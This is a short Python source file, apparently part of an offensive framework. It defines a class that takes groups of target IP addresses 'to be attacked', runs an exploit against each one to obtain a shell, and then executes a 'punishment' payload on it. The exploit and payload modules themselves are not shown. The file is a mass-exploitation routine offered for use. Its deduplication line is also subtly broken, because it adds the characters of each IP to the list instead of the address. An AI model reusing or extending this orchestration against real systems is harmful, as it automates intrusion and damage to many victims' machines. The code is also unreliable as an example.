import exploit_cl
import payload_cl
import shell_cl
import inspect

# Collection of ip addresses to be attacked

class TargetClctn(object):
	def __init__(self, os_group):
		self.os_group = os_group

	def run_routine(self, args, method, punishment,groups):
		used_ips = []
		# iterate through all ips in selected groups
		for i in groups:
			for ip in self.os_group[i]:
				if ip not in used_ips:
					shell = getattr(exploit_cl,method)(ip,args).get_shell() # execute exploit
					if issubclass(type(shell),shell_cl.shell_class): # make sure the shell exists
							getattr(payload_cl,punishment['type'])(shell,punishment["args"]).execute_payload()
							shell.close()
					used_ips += ip # add up to list of checked ips
		return


